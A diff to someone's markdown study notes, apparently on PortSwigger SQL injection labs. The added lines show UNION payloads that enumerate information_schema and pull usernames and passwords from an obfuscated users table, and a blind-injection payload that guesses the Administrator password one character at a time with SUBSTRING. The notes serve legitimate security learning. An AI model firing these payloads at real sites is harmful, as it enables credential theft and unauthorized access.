@@ -118,7 +118,63 @@ And we get these columns aha!
 
 Lets finally check what the column consist of by doing a union on usename and passwd
 
+> ' UNION SELECT col_a, col_b FROM table_name -- 
 Hmm the passwords are not in cleartext infact they are just ****** symbols?![dead_end](./lab_examining_db/deadend.png)
 
-Dead end!
+Dead end?!
 
+We try a broader query attempting to identify any column which have username or password and which tables
+
+Query Broad:
+> Gifts ' UNION SELECT 'tablename: ' || table_name,'column_name: ' || column_name FROM information_schema.columns WHERE 1=1 --
+
+[see returned html](./lab_examining_db/query_broad_ret.html)
+
+Aha we do a simple match for password or pass and get a hit!
+
+```HTML
+<tr>
+    <th>tablename: pg_roles</th>
+    <td>column_name: rolpassword</td>
+</tr>
+```
+
+However checking we also get ****** as password, Dead End?! the next match we see is
+
+```HTML
+<tr>
+    <th>tablename: users_rgeana</th>
+    <td>column_name: password_ryvjln</td>
+</tr>
+```
+
+this one looks promising, some obsufication done by Portswigger aswell! andd... we found the valid return!
+
+> Gifts ' UNION SELECT password_ryvjln,username_wcwybq FROM users_rgeana  -- 
+
+![admin-pass](./lab_examining_db/complete.png)
+
+
+## Blind SQL Queries
+
+Blind SQL occurs when the server does not return the results from an SQL query. Thus the techiniques using UNION are not effective :(
+
+However there are ways to exploit sql depending on changes in observable website behaviour such as the [tracking cookie](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/exploiting-blind-sql-injection-by-triggering-conditional-responses)
+
+The exploit boils down to extracting data one step at the time by writing conditional values at the end of the query to the cookie.
+
+Imagine a Genie that only answers yes/no how would you extract information? 
+- Slowly
+e.g., The date
+- Is today year >2000? Is it <2030? 
+- Is today month >6? Is it <7? 
+- Is today >1 AND < 5? 
+
+... repeat with narrower and narrower intervals
+
+For instance guessing the password 
+> xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+
+### [Lab Blind SQL with conditional response](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses)
+
+In this lab we will need to do some bruteforce hence what will be used is Burp Intruder!
